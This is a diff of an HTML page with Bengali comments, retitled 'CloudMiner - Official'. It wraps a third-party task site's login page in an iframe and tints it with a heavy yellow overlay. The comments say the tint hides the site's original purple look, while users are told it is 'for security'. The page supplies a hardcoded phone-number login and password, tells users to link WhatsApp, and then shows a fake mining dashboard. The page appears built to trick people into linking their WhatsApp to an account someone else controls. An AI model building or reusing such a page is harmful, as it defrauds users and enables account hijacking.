@@ -3,78 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Node - Activation</title>
+    <title>CloudMiner - Official</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --main-green: #25D366; --bg-dark: #0b141a; }
-        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-dark); font-family: sans-serif; overflow: hidden; color: white; }
+        :root { --wa-green: #25D366; --bg: #0b141a; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: sans-serif; overflow: hidden; color: white; }
 
-        /* ড্যাশবোর্ড ভিউ */
         .view { display: none; height: 100vh; flex-direction: column; }
         .active-view { display: flex; }
 
-        /* হেডার ফিক্সড (এটি নড়বে না) */
-        .fixed-header { background: #121b22; padding: 10px; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        .warn-box { background: #ff4757; padding: 8px; border-radius: 5px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 8px; }
-        .copy-group { display: flex; gap: 8px; }
-        .copy-btn { flex: 1; background: #2c3e50; border: 1px solid var(--main-green); padding: 8px; border-radius: 5px; text-align: center; font-size: 12px; cursor: pointer; color: white; }
+        /* হেডার ডিজাইন */
+        .fixed-header { background: #121b22; padding: 10px; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.5); position: relative; }
+        .warn { background: #ff4757; padding: 8px; border-radius: 5px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 8px; }
+        .copy-row { display: flex; gap: 8px; }
+        .copy-btn { flex: 1; background: #2c3e50; border: 1px solid #ffd700; padding: 8px; border-radius: 5px; text-align: center; font-size: 12px; cursor: pointer; color: white; }
 
-        /* আইফ্রেম এরিয়া (কালার পরিবর্তন সহ) */
-        .iframe-container { flex-grow: 1; position: relative; background: #fff; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+        /* আইফ্রেম কন্টেইনার এবং হলুদ পর্দা */
+        .iframe-container { flex-grow: 1; position: relative; background: #fff; overflow: hidden; }
         
-        /* এখানে "আয়না" বা কালার মাস্ক যা বেগুনি রঙ পাল্টে দেবে */
+        /* হলুদ আয়না পর্দা - ঘনত্ব বাড়ানো হয়েছে */
         .mirror-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(37, 211, 102, 0.15); /* সবুজ আভা */
-            backdrop-filter: hue-rotate(120deg) brightness(1.1); /* বেগুনিকে সবুজে রূপান্তর করবে */
-            pointer-events: none; z-index: 100;
+            background: rgba(255, 215, 0, 0.7); /* ঘন হলুদ কালার */
+            backdrop-filter: contrast(150%) brightness(90%); /* বেগুনি ভাব কাটানোর জন্য */
+            pointer-events: none; z-index: 500;
         }
 
-        iframe { width: 100%; height: 1500px; border: none; }
+        /* স্ক্রল বন্ধ করার জন্য আইফ্রেম সেটিংস */
+        iframe { 
+            width: 100%; 
+            height: 100%; 
+            border: none; 
+            pointer-events: auto;
+            position: absolute;
+            top: 0;
+        }
 
-        /* ভেরিফাই বাটন (ফোনের নিচে সবসময় ফিক্সড থাকবে) */
+        /* ফিক্সড ফুটার বাটন */
         .fixed-footer {
-            position: fixed; bottom: 0; width: 100%;
             background: #121b22; padding: 15px;
             border-top: 1px solid rgba(255,255,255,0.1);
             z-index: 2000; box-sizing: border-box;
         }
-        .verify-btn { background: var(--main-green); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 -5px 15px rgba(0,0,0,0.5); }
+        .main-btn { background: var(--wa-green); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
 
-        /* ড্যাশবোর্ড কার্ড */
-        .dash-card { background: #1f2c34; padding: 30px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
-        .pts-display { font-size: 45px; font-weight: bold; color: var(--main-green); }
+        /* ড্যাশবোর্ড স্টাইল */
+        .dash-card { background: #1f2c34; padding: 40px 20px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid #ffd700; }
+        .pts-text { font-size: 45px; font-weight: bold; color: #ffd700; }
     </style>
 </head>
 <body>
 
-<div id="view-task" class="view active-view">
+<div id="view-login" class="view active-view">
     <div class="fixed-header">
-        <div class="warn-box">⚠️ লগইন করে WhatsApp যুক্ত করুন</div>
-        <div class="copy-group">
-            <div class="copy-btn" onclick="copyVal('01321494267')">Copy ID</div>
-            <div class="copy-btn" onclick="copyVal('123456789')">Copy Pass</div>
+        <div class="warn">প্রথমে আইডি ও পাসওয়ার্ড দিয়ে লগইন করুন</div>
+        <div class="copy-row">
+            <div class="copy-btn" onclick="copyData('01321494267')">Copy ID</div>
+            <div class="copy-btn" onclick="copyData('123456789')">Copy Pass</div>
         </div>
     </div>
-
     <div class="iframe-container">
         <div class="mirror-overlay"></div>
-        <iframe src="https://www.taskm4u.com/#/login" id="taskIframe"></iframe>
+        <iframe src="https://www.taskm4u.com/#/login" id="loginIframe" scrolling="no"></iframe>
     </div>
-
     <div class="fixed-footer">
-        <button class="verify-btn" id="mainVerifyBtn" onclick="verifyAndRedirect()">Verify & Connect Dashboard</button>
+        <button class="main-btn" onclick="openHang()">লগইন করেছি, পরবর্তী ধাপ</button>
     </div>
 </div>
 
-<div id="view-dashboard" class="view">
-    <div class="dash-card">
-        <p style="color: #8696a0; margin: 0;">System Mining Active</p>
-        <div class="pts-display" id="finalPoints">0.00 PT</div>
-        <p style="color: var(--main-green); font-size: 12px;">● Online - 30 PT/hr</p>
+<div id="view-hang" class="view">
+    <div class="fixed-header">
+        <div class="warn" style="background: var(--wa-green);">এখন হোয়াটসঅ্যাপ লিঙ্ক করুন</div>
+        <p style="margin:0; font-size: 11px; text-align:center; color: #ffd700;">পর্দা হলুদ করা হয়েছে সিকিউরিটির জন্য</p>
     </div>
-    <div style="padding: 20px; text-align: center;">
-        <button class="verify-btn" style="background: #34495e;" onclick="location.reload()">Refresh Connection</button>
+    <div class="iframe-container">
+        <div class="mirror-overlay"></div>
+        <iframe src="about:blank" id="hangIframe" scrolling="no"></iframe>
+    </div>
+    <div class="fixed-footer">
+        <button class="main-btn" id="verifyBtn" onclick="verifyFinal()">Verify Connection</button>
+    </div>
+</div>
+
+<div id="view-final" class="view">
+    <div class="dash-card">
+        <p style="color: #8696a0;">Mining Dashboard Active</p>
+        <div class="pts-text" id="displayPts">0.00 PT</div>
+        <p style="color: var(--wa-green); font-size: 12px;">Mining Status: Online (30 PT/hr)</p>
     </div>
 </div>
 
